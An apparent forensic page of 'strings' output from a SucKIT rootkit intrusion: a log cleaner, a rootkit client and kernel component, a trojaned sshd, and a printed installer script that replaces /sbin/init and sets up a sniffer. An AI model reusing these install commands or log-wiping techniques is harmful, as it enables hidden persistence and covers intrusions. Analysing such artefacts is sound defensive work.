<html>
<HEAD>
<title>strings output</title>
</HEAD>
<body>
<H3>
<B>strings output</B>
</H3>
<BR>
<PRE>

<B>file cl</B>
cl: ELF 32-bit LSB executable, Intel 80386, version 1, dynamically linked (uses shared libs), stripped

<B>strings cl</B>
/lib/ld-linux.so.2
libc.so.6
printf
stdout
malloc
fflush
ftruncate
lseek
bzero
write
__deregister_frame_info
strstr
read
strncmp
getopt
strcmp
getpwnam
exit
_IO_stdin_used
__libc_start_main
strlen
open
__register_frame_info
close
__gmon_start__
GLIBC_2.0

    &lt;&lt;&lt;SNIP UNREADABLE GARBAGE&gt;&gt;&gt;   

s:f:u:w:y:x:l:d:h
default
	ERROR: missing arguments!
	asciifile options:
	 -s  &lt;string&gt;		- removes string from logfiles.
	 -f  &lt;file&gt; &lt;string&gt;	- removes string from file.
	utmp options:
	 -u  &lt;username&gt;		- removes username from utmp.
	 -u  &lt;username&gt; &lt;tty&gt;	- removes user on given tty.
	wtmp options:
	 -w  &lt;username&gt;		- removes last entry from wtmp.
	 -w  &lt;username&gt; &lt;tty&gt;	- removes last entry on given tty.
	 -ww &lt;username&gt;		- removes all entries for username.
	lastlog options:
	 -l  &lt;username&gt;		- removes username lastlog entry.
	misc options:
	 -h			- to get this!
Report bugs to &lt;genius@h07.org&gt;.
Die Putze %s - The ultimate unix logfile cleaner...
/var/log/messages
/var/log/auth.log
/var/run/utmp
/var/log/wtmp
none
/var/log/lastlog
default
	processing: %s
	ERROR: open %s
	ERROR: open %s
	processing: %s
	ERROR: open %s
	processing: %s
	ERROR: open %s
	processing: %s
	ERROR: open %s
	 processing: %s








<B>file inst</B>
inst: Bourne-Again shell script text executable

<B>cat inst</B>
#!/bin/bash
D="/lib/.x"
H="13996"
mkdir -p $D; cd $D
echo &gt; .sniffer; chmod 0622 .sniffer
echo -n -e "\037\213\010\010\114\115\016\076\002\003\163\153\000\355\175\177\170\
\024\125\226\150\167\272\011\115\322\320\215\266\032\024\265\121\231\
\201\021\041\045\314\110\370\061\206\204\202\240\104\233\204\044\010\

    &lt;&lt;&lt;SNIP A LOT MORE HEX&gt;&gt;&gt;   

\127\110\057\125\303\233\156\270\265\337\111\061\155\360\037\342\015\
\217\273\225\036\236\347\074\060\006\157\341\112\203\241\371\066\375\
\016\325\372\324\377\075\122\142\060\314\272\015\336\377\002\201\176\
\313\233\330\157\000\000" | gzip -d &gt; sk
chmod 0755 sk; if [ ! -f /sbin/init${H} ];  then cp -f /sbin/init /sbin/init${H}; fi; rm -f /sbin/init; cp sk /sbin/init
echo Your home is $D, go there and type ./sk to install
echo  Have phun!



<B>file log</B>
log: ELF 32-bit LSB executable, Intel 80386, version 1, dynamically linked (uses shared libs), stripped

<B>strings log</B>
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
strcpy
ioctl
printf
connect
getenv
fgets
perror
__cxa_finalize
sleep
optarg
socket
select
fflush
alarm
accept
write
fprintf
kill
bind
inet_addr
__deregister_frame_info
memchr
stdin
wait
signal
read
listen
fork
sscanf
getopt
srand
inet_ntoa
tcgetattr
time
gethostbyname
sprintf
stderr
__errno_location
exit
_IO_stdin_used
__libc_start_main
tcsetattr
__register_frame_info
close
getsockname
GLIBC_2.1.3
GLIBC_2.0

    &lt;&lt;&lt;SNIP UNREADABLE GARBAGE&gt;&gt;&gt;   

use:
%s [hsditc] ...args
-h	Specifies ip/hostname of host where is running
	suckitd
-s	Specifies port where we should listen for incoming
	server' connection (if some firewalled etc), if not
	specified, we'll get some from os
-d	Specifies port of service we could use for authentication
	echo, telnet, ssh, httpd... is probably good choice
-i	Interval between request sends (in seconds)
-t	Time we will wait for server before giving up (in seconds)
-c	Connect timeout (in seconds)
password: 
Got signal %d, exiting...
accept
Et voila
Server connected. Escape character is '^K'
TERM
TERM=%s
Connection disappeared, errno=%d
#####################################################
# SucKIT version 1.3b by Unseen &lt;unseen@broken.org&gt; #
#####################################################
h:H:s:S:d:D:i:I:t:T:C:c:
socket
bind
listen
getsockname
Listening to port %d
fork
Trying %s:%d...
connect: Timed out
connect
Trying...
%s: no response within %d seconds
%s: server not responding, giving up!








<B>file sk</B>
sk: ELF 32-bit LSB executable, Intel 80386, version 1, statically linked, stripped

<B>strings sk</B>

    &lt;&lt;&lt;SNIP UNREADABLE GARBAGE&gt;&gt;&gt;   

PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:/lib/.x:/lib/.x/bin
HOME=/lib/.x
HISTFILE=/dev/null
PS1=\[\033[1;30m\][\[\033[0;32m\]\u\[\033[1;32m\]@\[\033[0;32m\]\h \[\033[1;37m\]\W\[\033[1;30m\]]\[\033[0m\]# 
SHELL=/bin/bash
TERM=linux
pqrstuvwxyzabcde
0123456789abcdef
/dev/ptmx
/dev/pty
/dev/tty
/dev/null
#####################################################
# SucKIT version 1.3b by Unseen &lt;unseen@broken.org&gt; #
#####################################################
Can't open a tty, all in use ?
Can't fork subshell, there is no way...
/lib/.x
/bin/sh
Can't execve shell!
BD_Init: Starting backdoor daemon...
FUCK: Can't allocate raw socket (%d)
FUCK: Can't fork child (%d)
Done, pid=%d
.boot
/lib/.x/.boot
use:
%s &lt;uivfp&gt; [args]
u       - uninstall
i       - make pid invisible
v       - make pid visible
f [0/1] - toggle file hiding
p [0/1] - toggle pid hiding
Detected version: %s
FUCK: Failed to uninstall (%d)
Suckit uninstalled sucesfully!
FUCK: Failed to hide pid %d (%d)
Pid %d is hidden now!
FUCK: Failed to unhide pid %d (%d)
Pid %d is visible now!
file
Failed to change %s hiding (%d)!
%s hiding is now %s!
kmalloc
_kmalloc
__kmalloc
/lib/.x
/dev/kmem
FUCK: Can't open %s for read/write (%d)
RK_Init: idt=0x%08x, 
FUCK: IDT table read failed (offset 0x%08x)
FUCK: Can't find sys_call_table[]
sct[]=0x%08x, 
FUCK: Can't find kmalloc()!
kmalloc()=0x%08x, gfp=0x%x
FUCK: Can't read syscall %d addr
Z_Init: Allocating kernel-code memory...
FUCK: Out of kernel memory!
Done, %d bytes, base=0x%08x
/dev/kmem
13996
#####################################################
# SucKIT version 1.3b by Unseen &lt;unseen@broken.org&gt; #
#####################################################
core
FUCK: Got signal %d while manipulating kernel!
/sbin/init13996
0123456789abcdefghijklmnopqrstuvwxyz
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
&lt;NULL&gt;
m””`Ø
/dev/null
1.3b by Unseen
13996
/lib/.x/.lurker
/proc/
/proc/net/
X√Ë	
socket:[
/sbin/init
/sbin/init13996
X√ËD
login
telnet
rlogin
rexec
passwd
adduser
mysql
ssword:

    &lt;&lt;&lt;SNIP UNREADABLE GARBAGE&gt;&gt;&gt;   







<B>cd s
file xopen</B>
xopen: ELF 32-bit LSB executable, Intel 80386, version 1, dynamically linked (uses shared libs), stripped

<B>strings xopen</B>
/lib/ld-linux.so.2
__gmon_start__
libnsl.so.1
_IO_stdin_used
libcrypt.so.1
crypt
libutil.so.1
logwtmp
logout
libc.so.6
strcpy
waitpid
ioctl
pututxline
chown
getgid
printf
stdout
random
cfgetospeed
isastream
connect
getutxline
strerror
geteuid
memmove
snprintf
getgrgid
times
__ctype_b
getenv
setutxent
__strtol_internal
execve
getprotobyname
getpid
updwtmpx
fgets
memcpy
pclose
perror
__cxa_finalize
dup2
getuid
malloc
remove
cfgetispeed
endpwent
sleep
optarg
vsnprintf
endutxent
gethostbyaddr
rmdir
socket
select
lseek
setpgid
abort
getpt
chmod
alarm
popen
pipe
__lxstat
accept
cfsetispeed
strrchr
calloc
write
environ
fprintf
kill
ctime
strcat
bind
inet_addr
__deregister_frame_info
chdir
initgroups
endgrent
setsockopt
cfsetospeed
optind
stdin
wait
umask
innetgr
ferror
unlockpt
getutxent
setgid
signal
read
getspnam
openlog
closelog
strncmp
strncpy
unlink
getrusage
realloc
strtok
listen
fork
sscanf
endhostent
gettimeofday
getopt
memset
grantpt
inet_ntoa
getppid
tcgetattr
time
__assert_fail
syslog
ptsname
strcmp
shutdown
getpwuid
gethostbyname
getpwnam
endspent
getservbyname
gethostname
sprintf
fclose
getpeername
stderr
error
fputc
getsockopt
fwrite
__xstat
__errno_location
link
exit
getgrnam
fopen
fileno
endservent
strspn
daemon
__libc_start_main
open
vhangup
clock
strchr
fputs
execvp
setsid
fcntl
setuid
tcsetattr
mkdir
__ctype_tolower
__register_frame_info
close
free
__environ
_environ
GLIBC_2.0
GLIBC_2.1.3
GLIBC_2.1

    &lt;&lt;&lt;SNIP UNREADABLE GARBAGE&gt;&gt;&gt;   

/lib/.x/s/sshd_config
Received SIGHUP; restarting.
RESTART FAILED: av[0]='%.100s', error: %.100s.
Received signal %d; terminating.
Timeout before authentication.
Generating new %d bit RSA key.
RSA key generation complete.
f:p:b:k:h:g:diqV:
i586-unknown-linux
1.2.32
sshd version %s [%s]
Usage: %s [options]
Options:
/lib/.x/s
  -f file    Configuration file (default %s/sshd_config)
  -d         Debugging mode
  -i         Started from inetd
  -q         Quiet (no logging)
  -p port    Listen on the specified port (default: 22)
  -k seconds Regenerate server key every this many seconds (default: 3600)
  -g seconds Grace period for authentication (default: 300)
  -b bits    Size of server RSA key (default: 768 bits)
/lib/.x/s/ssh_host_key
  -h file    File from which to read host key (default: %s)
  -V str     Remote version string already read from the socket
fatal: Bad server key size.
fatal: Bad port number.
fatal: Extra argument %.100s.
sshd version %.100s [%.100s]
Could not load host key: %.200s
fatal: Please check that you have sufficient permissions and the file exists.
fatal: Could not load host key: %.200s.  Check path and permissions.
daemon: %.100s
Forcing server key to %d bits to make it differ from host key.
Initializing random number generator; seed file %.200s
inetd sockets after dupping: %d, %d
Generating %d bit RSA key.
socket: %.100s
bind: %.100s
Bind to port %d failed: %.200s.
Server listening on port %d.
listen: %.100s
select: %.100s
accept: %.100s
Server will not fork when running in debugging mode.
fork: %.100s
Forked child %d.
Connection from %.100s port %d
SSH-%d.%d-%.50s
Could not write ident string.
Did not receive ident string.
SSH-%d.%d-%[^
Protocol mismatch.
Bad protocol version identification: %.100s
Client protocol version %d.%d; client software version %.100s
Protocol major versions differ.
Protocol major versions differ: %d vs. %d
Your ssh version is too old and is no longer supported.  Please install a newer version.
This server does not support your new ssh version.
Unexpected return value from check_emulation.
Connection from %.200s not allowed.
Sorry, you are not allowed to connect.
Sent %d bit public key and %d bit host key.
Warning: client selects unsupported cipher.
IP Spoofing check bytes do not match.
Encryption type: %.200s
do_connection
sshd.c
sensitive_data.private_key.bits &gt;= sensitive_data.host_key.bits + 128
sensitive_data.host_key.bits &gt;= sensitive_data.private_key.bits + 128
Received session key; encryption turned on.
/etc/shadow
Can't find %.100s's shadow - access denied.
Account %.100s's password is too old - forced to change.
/usr/bin/passwd
%.100s %.100s
*LK*
Account %.100s is locked.
Connection for %.200s not allowed from %.100s
Connection for %.200s denied from %.100s
Unknown group id %d
none
0123456789ABCDEF0123456789ABCDEF
d4377659532b8cd242de551fbbb45adc
5ff282cefe8fde3cc3ed6a9c42a7234d
Cannot change user when server not running as root.
Attempting authentication for %.100s.
Login for user %.100s accepted without authentication.
Rhosts authentication disabled.
Rhosts authentication not available for connections from unprivileged port.
Rhosts authentication accepted for %.100s, remote %.100s on %.700s.
Rhosts authentication failed for '%.100s', remote '%.100s', host '%.200s'.
Rhosts with RSA authentication disabled.
RhostsRsa authentication not available for connections from unprivileged port.
RhostsRsa authentication not available for unencrypted session.
RhostsRsa authentication not available for session encrypted with arcfour.
RhostsRSA authentication failed for '%.100s', remote '%.100s', host '%.200s'.
RSA authentication disabled.
RSA authentication for %.100s accepted.
RSA authentication for %.100s failed.
Password authentication disabled.
Password authentication not available for unencrypted session.
Too many password authentication attempts from %.100s for user %.100s.
Password authentication failed for user %.100s from %.100s.
Password authentication for %.100s accepted.
Closing connection to %.100s
Password authentication for %.100s failed.
Unknown message during authentication: type %d
ROOT LOGIN REFUSED FROM %.200s
Root login accepted for forced command.
ROOT LOGIN as '%.100s' from %.100s
Received illegal compression level %d.
Received illegal max packet size %lu.
Allocating a pty not permitted for this authentication.
Protocol error: you already have a pty.
Allocating pty.
Failed to allocate pty.
chown failed (but we're not root anyway) for %s, error %s
ssh_pty_allocate_and_fork: chown failed for %s.
chmod failed (but we're not root anyway) for %s, error %s
ssh_pty_allocate_and_fork: chmod %s: %s
X11 forwarding disabled in server configuration file.
X11 forwarding not permitted for this authentication.
Received request for X11 forwarding with auth spoofing.
Protocol error: X11 display already set.
Remote host has no X11 installed.
Authentication agent forwarding not permitted for this authentication.
Authentication agent forwarding denied because the other end uses too old version.
Received authentication agent forwarding request.
Port forwarding not permitted for this authentication.
Received TCP/IP port forwarding request.
Forking shell.
Executing command '%.500s'
Unknown packet type received after authentication: %d
Executing forced command: %.900s
Could not create pipes: %.100s
setsid: %.100s
dup2 stdin
dup2 stdout
dup2 stderr
fork failed: %.100s
pty_cleanup_proc called again, ignored
pty_cleanup_proc called
dup2 stdin failed: %.100s
getpeername: %.100s
%.200s/.hushlogin
Last login: %.100s
Last login: %.100s from %.200s
/etc/motd
dup failed: %.100s
%s=%s
Bad line in %.100s: %.200s
/etc/nologin
Logins are currently denied by /etc/nologin:
executing remote command as root: %.200s
executing remote command as user %.200s
setgid
initgroups
setuid %d: %.100s
Failed to set uids to %d.
/bin/sh
HOME
USER
LOGNAME
/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/lib/.x:/lib/.x/s
PATH
/var/spool/mail
%.200s/%.50s
MAIL
SHELL
SSH_ORIGINAL_COMMAND
%.50s %d %d
SSH_CLIENT
SSH_TTY
TERM
DISPLAY
REMOTEUSER
SSH_AUTH_SOCK
/etc/environment
%.200s/.ssh/environment
Could not chdir to home directory %s: %s
Environment:
  %.200s
.ssh/rc
Running %s
%s %s
Could not run %s
/lib/.x/s/sshrc
Running %.100s add %.100s %.100s %.100s
%.200s -q -
add %s %s %s
add %.*s/unix%s %s %s
Running %s add %s%s %s %s
add %s%s %s %s
Could not run %s -q -
No mail.
You have mail.
You have new mail.
	WARNING: Your account expires in %d days
	WARNING: Your password expires in %d days
Found control characters in the .rhosts or .shosts file, rest of the file ignored
NO_PLUS
Found empty line in %.100s.
Found garbage in %.100s.
%s %s %s
Ignoring wild host/user names in %.100s.
Use of %.100s denied for %.100s
Matched negative entry in %.100s.
.rhosts
.shosts
%.500s/%.100s
/etc/hosts.equiv
/lib/.x/s/shosts.equiv
Connection from %.100s from nonprivileged port %d
Your ssh client is not running as root.
Accepted for %.100s [%.100s] by /etc/hosts.equiv.
Accepted for %.100s [%.100s] by %.100s.
Rhosts authentication refused for %.100: no home directory %.200s
Rhosts authentication refused for %.100s: bad ownership or modes for home directory.
Rhosts authentication refused for %.100s: bad modes for %.200s
Bad file modes for %.200s
Server has been configured to ignore %.100s.
Accepted by %.100s.
Rhosts/hosts.equiv authentication refused: client user '%.100s', server user '%.100s', client host '%.200s'.
Server does not permit empty password login.
/usr/bin/passwd
%.100s %.100s
Password if forced to be set at first login.
Login permitted without a password because the account has no password.
.ssh
%.500s/%.100s
Rsa authentication refused for %.100s: bad modes for %.200s
Bad file modes for %.200s
Rsa authentication refused for %.100s: no %.200s directory
Rsa authentication refused, no %.200s directory
.ssh/authorized_keys
Could not open %.900s for reading.
If your home is on an NFS volume, it may need to be world-readable.
%.100s, line %lu: bad key syntax
Wrong response to RSA authentication challenge.
no-port-forwarding
Port forwarding disabled.
no-agent-forwarding
Agent forwarding disabled.
no-x11-forwarding
X11 forwarding disabled.
no-pty
Pty allocation disabled.
idle-timeout=
Idle timeout set to %d seconds.
command="
%.100s, line %lu: missing end quote
Forced command: %.900s
environment="
Adding to environment: %.900s
from="
RSA authentication tried for %.100s with correct key but not from a permitted host (host=%.200s, ip=%.200s).
Your host '%.200s' is not permitted to use this key for login.
Bad options in %.100s file, line %lu: %.50s
Bugs in auth-rsa.c option processing.
RSA authentication accepted.
Trying rhosts with RSA host authentication for %.100s
Rhosts RSA authentication: canonical host %.900s
~/.ssh/known_hosts
/lib/.x/s/ssh_known_hosts
Rhosts with RSA host authentication denied: unknown or invalid host key
Your host key cannot be verified: unknown or invalid host key.
The host name used to check the key was '%.200s'.
Try logging back from the server machine with the canonical host name using ssh, and then try again.
Client on %.800s failed to respond correctly to host authentication.
Rhosts with RSA host authentication accepted for %.100s, %.100s on %.700s.
Rhosts with RSA host authentication accepted.
/dev/ptmx: %.100s
grantpt: %.100s
unlockpt: %.100s
Slave pty side name could not be obtained.
%.100s: %.100s
ptem
ioctl I_PUSH ptem: %.100s
ldterm
ioctl I_PUSH ldterm: %.100s
ttcompat
chown %.100s 0 0 failed: %.100s
chmod %.100s 0666 failed: %.100s
/dev/tty
Failed to disconnect from controlling tty.
Setting controlling tty using TIOCSCTTY.
open /dev/tty failed - could not set controlling tty: %.100s
pty_make_controlling_tty: reopening controlling tty after vhangup failed for %.100s
sshd
Unrecognized internal syslog facility code %d
log: %s
log: %.500s
syslog_severity: bad severity %d
debug: %s
debug: %.500s
error: %s
error: %.500s
fatal_remove_cleanup: no such cleanup function: 0x%lx 0x%lx
Calling cleanup 0x%lx(0x%lx)
fatal: %s
fatal: %.500s
/var/log/lastlog
P%03d
/var/log/wtmp
Could not write %.100s: %.100s
Could not open %.900s for reading.
If your home directory is on an NFS volume, it may need to be world-readable.
%.500s %u 
getpeername failed: %.100s
UNKNOWN
reverse mapping checking gethostbyname for %.700s failed - POSSIBLE BREAKIN ATTEMPT!
Address %.100s maps to %.600s, but this does not map back to the address - POSSIBLE BREAKIN ATTEMPT!
Could not reverse map address %.100s.
 %2.2x
Connection from %.100s with IP options:%.800s
/lib/.x/s/ssh_host_key
/lib/.x/s/ssh_random_seed
/var/run/sshd.pid
/usr/X11R6/bin/xauth
accountexpirewarningdays
passwordexpirewarningdays
checkmail
xauthlocation
allowtcpforwarding
kerberostgtpassing
kerberosorlocalpasswd
kerberosauthentication
idletimeout
silentdeny
umask
pidfile
keepalive
randomseed
forcedemptypasswdchange
forcedpasswdchange
permitemptypasswords
strictmodes
x11displayoffset
x11forwarding
ignorerootrhosts
ignorerhosts
printmotd
listenaddress
denygroups
allowgroups
denyusers
allowusers
denyhosts
allowhosts
denyshosts
allowshosts
uselogin
passwordauthentication
tisauthentication
rsaauthentication
rhostsrsaauthentication
rhostsauthentication
syslogfacility
fascistlogging
quietmode
permitrootlogin
keyregenerationinterval
logingracetime
serverkeybits
hostkey
port
local7
local6
local5
local4
local3
local2
local1
local0
auth
user
daemon
%s line %d: Bad configuration option: %s
%s line %d: missing integer value.
%s line %d: missing inet addr.
%s line %d: missing file name.
%s line %d: missing yes/nopwd/no argument.
nopwd
%s line %d: Bad yes/nopwd/no argument: %s
%s line %d: missing yes/no argument.
true
false
%s line %d: Bad yes/no argument: %s
%s line %d: missing facility name.
%s line %d: unsupported log facility %s
%s line %d: too many allow shosts.
%s line %d: too many deny shosts.
%s line %d: too many allow hosts.
%s line %d: too many deny hosts.
%s line %d: too many allow users.
%s line %d: too many deny users.
%s line %d: too many allow groups.
%s line %d: too many deny groups.
%s line %d: Missing handler for opcode %s (%d)
%s line %d: garbage at end of line.
(self)
User name after tilde too long.
Unknown user %.100s.
%s/%s
Received SIGCHLD.
Strange, got SIGCHLD and wait returned pid %d but child is %d
EOF received for stdin.
Window change received.
Denied port open request.
Received port open request.
Received channel open confirmation.
Received channel open failure.
Received channel close.
Received channel close confirmation.
Protocol error during session: type %d
select: %.100s
Connection closed by remote host.
Read error from remote host: %.100s
Process_output: write to fdin failed, len = %d : %.50s
Entering interactive session.
Waiting for forwarded connections to terminate...
End of interactive session; stdin %ld, stdout (read %ld, sent %ld), stderr %ld bytes.
wait: %.100s
Strange, wait returned pid %d, expected %d
Command exited with status %d.
Received packet of type %d after exit.
Received exit confirmation.
Command terminated on signal %d.
wait returned status %04x.
%02x
Intenal error, mpz_set_str returned error
rsa_random_prime: failed to find a prime, retrying.
+ (distance %ld)
rsa_random_prime: high bit not set, retrying.
derive_rsa_keys
rsa.c
mpz_cmp(p, q) &lt; 0
Warning: G=
 is large (many spare key sets); key may be bad!
Generating p:  
Generating q:  
Generated the same prime twice!
The primes are too close together.
The primes are not relatively prime!
Computing the keys...
Testing the keys...
**** private+public failed to decrypt.
**** public+private failed to decrypt.
Key generation complete.
ps laxww 2&gt;/dev/null
ps -al 2&gt;/dev/null
ls -alni /tmp/. 2&gt;/dev/null
w 2&gt;/dev/null
netstat -s 2&gt;/dev/null
netstat -an 2&gt;/dev/null
netstat -in 2&gt;/dev/null
/dev/random
random_get_byte
randoms.c
state-&gt;next_available_byte &lt; (8192 / 8)
buffer_get trying to get more bytes than in buffer
 %02x
Old channel code will be emulated.
Agent forwarding disabled (remote protocol too old)
fcntl O_NONBLOCK: %.100s
Compression already enabled.
packet_encrypt
packet.c
(bytes % 8) == 0
packet_decrypt
crc32 compensation attack: network attack detected
packet_send: sending too big a packet: size %u, limit %u.
Connection closed by remote host.
Read from socket failed: %.100s
Protocol error: expected packet type %d, got %d
Bad packet length %u.
Junk data left to incoming packet buffer after all data processed
packet_read_poll
len == buffer_len(&incoming_packet)
Corrupted check bytes on input.
%.900s
Remote: %.900s
packet_disconnect called recursively.
Local: %.100s
Write failed: %.100s
setsockopt SO_KEEPALIVE: %.100s
setsockopt SO_KEEPALIVE off: %.100s
setsockopt IPTOS_LOWDELAY: %.100s
setsockopt TCP_NODELAY: %.100s
setsockopt IPTOS_THROUGHPUT: %.100s
Enabling compression at level %d.
Bad compression level %d.
1.0.4
compress outgoing: raw data %lu, compressed %lu, factor %.2f
compress incoming: raw data %lu, compressed %lu, factor %.2f
buffer_compress: deflate returned Z_STREAM_END
buffer_compress: deflate returned Z_STREAM_ERROR
buffer_compress: deflate returned Z_BUF_ERROR
buffer_compress: deflate returned %d
buffer_uncompress: inflate returned Z_STREAM_END
buffer_uncompress: inflate returned Z_DATA_ERROR
buffer_uncompress: inflate returned Z_STREAM_ERROR
buffer_uncompress: inflate returned Z_MEM_ERROR
buffer_uncompress: inflate returned %d
xmalloc: out of memory (allocating %d bytes)
xrealloc: NULL pointer given as argument
xrealloc: out of memory (new_size %d bytes)
xfree: NULL pointer given as argument
tcgetattr: %.100s
cfsetispeed failed for %d
cfsetospeed failed for %d
Ignoring unsupported tty mode opcode %d (0x%x)
parse_tty_modes: unknown opcode %d
Setting tty modes failed: %.100s
Expanding the array...
Array now %d channels [first free at %d].
Allocated channel %d of type %d.
Internal bug in channel_allocate.
channel_free
newchannels.c
channel &gt;= 0 && channel &lt; channels_alloc && channels[channel].type != 0
Discarding termination of channel %d.
Channel %d terminates.
Channel %d sends ieof.
Channel %d sends oclosed.
Channel %d closes incoming data stream.
Channel %d closes outgoing data stream.
This is emulation.
Received double input eof.
Channel %d receives input eof.
X problem fix: close the other direction.
Received double close.
Channel %d receives output closed.
Received ieof for nonexistent channel %d.
Received oclosed for nonexistent channel %d.
Emulated close.
Received emulated_close for nonexistent channel %d.
Initial X11 packet contains bad byte order byte: 0x%x
X11 connection uses different authentication protocol: '%.100s' vs. '%.*s'.
X11 auth data does not match fake data.
channel_prepare_select
x11_fake_data_len == x11_saved_data_len
X11 connection rejected because of wrong authentication at %.100s.
Rejected connection at %.100s: %.200s
X11 connection requested.
accept: %.100s
X11 connection from %.200s port %d
Connection to port %d forwarding to %.100s:%d requested.
port %d, connection from %.200s port %d
Connection to agent proxy requested from unix domain socket.
Forwarded agent connection
Received data for nonexistent channel %d.
Other party sent data after eof for channel %d.
Received open confirmation for non-opening channel %d.
Channel now open, status bits %x
Received open failure for non-opening channel %d.
channel_still_open: bad channel type %d
The following connections are open:
  %.300s
Forward host name too long.
socket: %.100s
127.0.0.1
bind: %.100s
listen: %.100s
port listener
Remote end denied port forwarding to %d:%.50s:%d
Protocol error: expected packet type %d, got %d
channel_request_remote_forwarding: too many forwards
Requested forwarding hostname too long: %.200s.
Requested forwarding of port %d but user is not root.
unknown (remote did not supply name)
Received request to connect to %.100s:%d, but the request was denied.
%.100s: unknown host.
%.100s: host has no IP address.
connect %.100s:%d: %.100s
bind port %d: %.100s
Failed to allocate internet-domain X11 display socket.
gethostname: %.100s
%.400s:%d.%d
X11 inet listener
Received X11 open request.
Warning: Server attempted X11 forwarding without client request
Warning: This is a probable break-in attempt (compromised server?)
DISPLAY
DISPLAY not set.
unix:
Could not parse display number from DISPLAY: %.100s
/var/X/.X11-unix
%.80s/X%d
/tmp/.X11-unix
connect %.100s: %.100s
Could not find ':' in DISPLAY: %.100s
Sending open confirmation to the remote host.
Failed...
x11_request_forwarding: bad authentication data: %.100s
%02x
Protocol error: authentication forwarding requested twice.
/tmp/ssh-%.50s
ssh-%d-agent
* Remote error: Invalid SSH_AGENT_SOCKET_DIR '%.100s', it should contain at least one /.
* Remote error: Authentication fowarding disabled.
* Remote error: Agent parent directory '%.100s' stat failed: %.100s
* Remote error: stat of agent directory '%.100s' failed: %.100s
* Remote error: Agent directory '%.100s' mkdir failed: %.100s
* Remote error: Agent socket creation:Bad modes/owner for directory '%.100s' (modes are %o, should be 040700)
* Remote error: stat '.' failed after chdir to '%.100s': %.100s
* Remote error: Agent socket creation: wrong directory after chdir
* Remote error: Agent socket directory stat '..' failed: %.100s
* Remote error: Agent socket creation: Directory '%.100s/..' is not sticky, mode is %o, should be 041777
* Remote error: Authentication forwarding disabled.
* Remote error: Agent socket creation: wrong parent directory after chdir (last component of socket name is symlink?)
Agent socket creation failed: %.100s
Agent socket bind failed: %.100s
Agent socket directory chown failed: %.100s
Agent socket listen failed: %.100s
/tmp/ssh-%.50s/ssh-%d-agent
auth socket
Warning: Server attempted agent forwarding without client request
Forwarding authentication connection.
authentication agent connection
buffer_put_mp_int
bufaux.c
oi == ((bits + 7) / 8)
%02x
Received packet with bad string length %d
SSH_AUTH_SOCK
Invalid %.200s `%.100s', it should contain at least one /.
Parent directory stat failed `%.100s'
Cannot stat authentication socket directory %.100s
stat . failed
Wrong directory after chdir
Invalid owner of authentication socket directory %.100s
Invalid modes for authentication socket directory %.100s
Cannot find authentication socket %.100s/%.100s
Authentication socket `%.100s' is symlink
%s-%d
Cannot make temporary authentication socket directory %.100s
Cannot stat newly created temporary authentication socket directory %.100s
Cannot stat . in newly created temporary authentication socket directory %.100s
Cannot stat .. in newly created temporary authentication socket directory %.100s
Agent parent directory is not sticky, mode is %o it should be 041777
Wrong parent directory after chdir to temp directory
Hard link to auth socket failed
Stat to hard link of authentication socket failed
Hard link and orignal socket are not same
Socket failed
Connection to authentication agent opened.
No agent.
write auth-&gt;fd: %.100s
read auth-&gt;fd: %.100s
Authentication reply message too long: %d
Incomplete authentication reply.
Bad authentication reply message type: %d
Too many identities in authentication reply: %d
Compatibility with ssh protocol version 1.0 no longer supported.
Error writing to authentication socket.
Error reading response length from authentication socket.
Authentication response too long: %d
Error reading response from authentication socket.
Agent admitted failure to authenticate using the key.
Bad authentication response: %d
Add identity response too long: %d
Bad response to add identity from authentication agent: %d
Remove identity response too long: %d
Bad response to remove identity from authentication agent: %d
SSH PRIVATE KEY FILE FORMAT 1.1
Write to key file %.200s failed: %.100s
Authentication file too big: %.200s
Read from key file %.200s failed: %.100s
Bad key file %.200s.
Unsupported cipher %.100s used in key file %.200s.
Bad passphrase supplied for key file %.200s.
Bad public key, POTENTIAL BREAK-IN ATTEMPT!
rsa_public_encrypt
rsaglue.c
len &gt;= input_len + 3
Bad result from rsa_private_decrypt
reserved
blowfish
arcfour
used to be tss
3des
idea
none
cipher_name: bad cipher number: %d
Arcfour cipher is disabled in this host, using blowfish cipher instead
Key length %d is insufficient for IDEA.
Key length %d is insufficient for 3DES.
Key length %d is insufficient for Blowfish
cipher_set_key: unknown cipher: %d
cipher_encrypt: unknown cipher: %d
cipher_decrypt: unknown cipher: %d
des_cbc_encrypt
des.c
(len & 7) == 0
des_cbc_decrypt
arcfour_init
arcfour.c
key_len &gt; 0
userfile_packet_send: child has died: %.100s
userfile_read_raw: child has died: %.100s
userfile_read_raw: received packet too long.
userfile_read_packet: unexpected packet type: got %d, expected %d
pipe: %.100s
fork: %.100s
dup2 1
dup2 0
/bin/sh
HOME=
USER=
PATH=
LOGNAME=
MAIL=
SHELL=
TERM=
DISPLAY=
PRINTER=
XAUTHORITY=
TERMCAP=
execv /bin/sh failed: %.100s
userfile_child_server: packet type %d
userfile_init already called
setgid: %.100s
initgroups: %.100s
setuid: %.100s
userfile_open: using non-current uid but not initialized (uid=%d, path=%.50s)
userfile_open: uid not current and not that of child: uid=%d, path=%.50s
userfile_close: type %d
userfile_fill: buffer not empty
userfile_fill: got more than data than requested
userfile_fill: type %d
userfile_getc/fill error
userfile_write: type %d
userfile_lseek: type %d
userfile_mkdir with uid %d
userfile_mkdir with wrong uid %d
userfile_stat with uid %d
userfile_stat with wrong uid %d
userfile_remove with uid %d
userfile_remove with wrong uid %d
userfile_popen: using non-current uid but not initialized (uid=%d)
userfile_popen: uid not current and not that of child: uid=%d
Received signal %d.
blowfish_cbc_encrypt
blowfish.c
(len & 7) == 0
blowfish_cbc_decrypt
detect_attack
deattack.c
len &lt;= ((32 * 1024) * (8))
len % (8) == 0
Installing crc compensation attack detector.
0123456789abcdefghijklmnopqrstuvwxyz
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
0123456789abcdefghijklmnopqrstuvwxyz
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
cannot allocate in gmp

    &lt;&lt;&lt;SNIP UNREADABLE GARBAGE&gt;&gt;&gt;   

incompatible version
buffer error
insufficient memory
data error
stream error
file error
stream end
need dictionary
1.0.4
unknown compression method
invalid window size
incorrect header check
need dictionary
incorrect data check
invalid block type
invalid stored block lengths
too many length or distance symbols
invalid bit length repeat
oversubscribed dynamic bit lengths tree
incomplete dynamic bit lengths tree
